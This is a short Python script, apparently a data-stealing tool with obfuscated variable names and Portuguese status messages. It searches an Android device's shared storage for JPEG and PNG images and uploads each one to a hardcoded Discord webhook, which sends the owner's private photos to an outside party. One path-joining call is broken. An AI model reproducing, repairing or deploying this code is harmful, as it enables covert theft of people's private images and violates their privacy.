import os as a1, requests as a2

status = 1

a3 = "/storage/emulated/0"
a4 = "https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"

def a5(a6):
    try:
        with open(a6, "rb") as a7:
            a8 = {"file": (a6.split("/")[-1], a7)}
            r = a2.post(a4, files=a8)
            return r.status_code in (200, 204)
    except:
        return False

def a9():
    a10 = []
    for root, dirs, files in a1.walk(a3):
        for f in files:
            if f.lower().endswith((".jpg", ".jpeg", ".png")):
                a10.append(a1.join(root, f))
    return a10

def a13():
    if status != 1:
        print("[*] Status != 1, abortando envio.")
        return
    a14 = a9()
    for a15 in a14:
        if a5(a15):
            print(f"[+] Enviado: {a15}")
        else:
            print(f"[!] Falha no envio: {a15}")

if __name__ == "__main__":
    a13()
